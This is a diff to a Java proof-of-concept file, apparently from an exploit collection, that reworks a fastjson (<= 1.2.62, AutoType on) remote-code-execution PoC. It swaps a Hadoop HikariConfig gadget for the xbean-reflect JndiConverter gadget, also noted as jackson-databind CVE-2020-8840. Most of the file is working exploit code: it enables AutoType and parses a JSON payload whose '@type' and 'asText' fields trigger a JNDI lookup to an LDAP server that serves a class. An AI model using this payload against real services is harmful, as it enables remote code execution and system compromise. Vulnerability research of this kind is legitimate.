+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/JndiConverterPoc.java
@@ -1,4 +1,4 @@
-package com.threedr3am.bug.fastjson;
+package com.threedr3am.bug.fastjson.rce;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
@@ -7,15 +7,18 @@ import com.threedr3am.bug.common.server.LdapServer;
 /**
  * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)
  *
+ * Jackson-databind的CVE-2020-8840 gadget与Fastjson通用
+ *
+ * XBean-reflect依赖的gadget
+ *
  * <dependency>
- *       <groupId>org.apache.hadoop</groupId>
- *       <artifactId>hadoop-client-minicluster</artifactId>
- *       <version>3.2.1</version>
+ *       <groupId>org.apache.xbean</groupId>
+ *       <artifactId>xbean-reflect</artifactId>
  * </dependency>
  *
  * @author threedr3am
  */
-public class HadoopHikariPoc {
+public class JndiConverterPoc {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -27,8 +30,7 @@ public class HadoopHikariPoc {
   public static void main(String[] args) {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
-    String payload2 = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
+    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
     JSON.parse(payload);
   }
 }
